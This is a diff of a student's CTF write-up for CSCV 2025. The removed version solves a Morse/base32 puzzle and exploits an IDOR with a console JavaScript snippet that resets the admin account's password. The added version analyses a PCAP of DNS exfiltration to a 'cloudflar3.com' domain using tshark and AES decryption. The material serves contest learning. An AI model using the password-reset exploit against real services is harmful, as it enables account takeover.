@@ -1,47 +1,36 @@
-> On 18/10/2025, I was involved in the Cybersecurity Student Contest Vietnam 2025 — a prestigious competition. The contest was quite challenging for me, but I managed to solve two problems easily.
+# DNSEXFILL
+**Summary problem : I have a PCAP file which contain many DNS capture and two logs file**
+I used the strings command on the PCAP file and noticed many common website here :+1: ![image](https://hackmd.io/_uploads/BJ-m-O8Rge.png)
+As I continue scrolling , I found some suspicious strings :+1: ![image](https://hackmd.io/_uploads/BJOEZdUAxg.png)
 
-# 1.README(S)?
-Because this was a warm-up question, I didn’t have much time to solve it. The problem is:
-![image](https://hackmd.io/_uploads/rkijy_LCge.png)
-It introduced some information about CNSV2025, which was not relevant. Then I clicked on the hint and saw Morse code:
-`.. -. .--- ..- --. ...- .-. ... --. .- --.. -.. -.- -.... ..--- -.. -. ..... ..--- .-- ....- ..... -.. ..-. --- .--- ..- .-- ....- --.. ..--- -.. .--. ..-. .-. --. -.- ....- - -.. --- .--- ..- .-- ..--- --.. .--- -. -.- -. ..- --. -.-. ....- - .--- -. --.. - ...- . --.. .-.. - --- -... -..- .-- ....- ....- ...-- .--- -- .--- ..- .-- -.-- ..--- .-.. ..- .--. . .-- ...- --. --.. .-.. -.. --- ...- --.. --. ... ...-- - .... .--- ..... ..--- -..- . .-. - ...- --- .-. ..--- -..- . --.. .-.. .....`
-I decoded morse and base32 to obtain a flag :+1: `CSCV2025{CounteringCybercrime-SharingResponsibility-SecuringOurFuture}`
-# 2.Web — Leak Force
-Initially, I encountered a website with a login background.
-While exploring the page source, I found something more interesting: a clue in the app.js file.
-![image](https://hackmd.io/_uploads/Hy6BxuURxe.png)
-From this, I realized that the issue was an IDOR (Insecure Direct Object Reference) vulnerability.
-I seen code
-![image](https://hackmd.io/_uploads/BJjLl_U0ll.png)
-The vulnerability lies in the server’s trust. The server blindly trusted the data sent by the client, specifically the id field.
-`body: JSON.stringify({ id: myId, newPassword })`
-This line of code means: “Send a password reset request, and tell the server to change the password for the user whose id is myId.
 
-I can easily modify this request (using the F12 Console) to rest password account admin. I paste the code here
+Press enter or click to view image in full size
+
+I try filter this suspicious by command :
+
+`tshark -r 10.10.0.53_ns_capture.pcap -Y 'dns.qry.name contains "hex.cloudflar3.com"' -T fields -e dns.qry.name | uniq`
+This is result :
 
 ```
-(async function() {
-    var targetId = 1; // Thử ID của admin (hoặc user khác)
-    var newPassword = '123'; // Mật khẩu mới bạn muốn đặt
-
-    const resp = await fetch('/api/reset-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ id: targetId, newPassword: newPassword })
-    });
-    
-    const result = await resp.json();
-    
-    if (resp.ok) {
-        console.log('THÀNH CÔNG! Đã đổi mật khẩu của user ID:', targetId, result);
-        alert('THÀNH CÔNG! Thử đăng nhập bằng tài khoản admin và mật khẩu ' + newPassword);
-    } else {
-        console.error('THẤT BẠI:', result);
-    }
-})();
+p.c7aec5d0d81ba8748acac6931e5add6c24b635181443d0b9d2.hex.cloudflar3.com
+p.f8aad90d5fc7774c1e7ee451e755831cd02bfaac3204aed8a4.hex.cloudflar3.com
+p.3dfec8a22cde4db4463db2c35742062a415441f526daecb59b.hex.cloudflar3.com
+p.f6af1ecb8cc9827a259401e850e5e07fdc3c1137f1.hex.cloudflar3.com
+f.6837abc6655c12c454abe0ca85a596e98473172829581235dd.hex.cloudflar3.com
+f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com
 ```
-![image](https://hackmd.io/_uploads/By_YgO80xe.png)
-Continue,i can easy login and obtain flag :
+I reviewed the access file and logfile to see scan anything relative to hex that i find.
 
-`CSCV2025{7h3_Uni73d_N47i0ns_C0nv3n7i0n_4g4ins7_Cyb3rcrim3}`
-> Through this very competitive contest, I realized more weaknesses in myself .The truth is, I couldn’t solve any forensic problems — even though I had considered that one of my strengths .I joined the contest mainly for fun and to gain experience .See you in the contest next year, and I hope I can achieve a higher rank next time.
+After some time, i finded keyword in the log file :+1: ![image](https://hackmd.io/_uploads/SJ0rWuURlg.png)
+
+
+Press enter or click to view image in full size
+
+Finally , i was able to encode SHA256 hash withAPP-SECREC key , divide it to an aes-key and aes-iv , and them use to decode hex values
+![image](https://hackmd.io/_uploads/By8L-OL0ge.png)
+![image](https://hackmd.io/_uploads/BkaIb_UAeg.png)
+
+
+Flag :
+
+`CSCV2025{DnS_Exf1ltr4ti0nnnnnnnnnnNN!!}`  
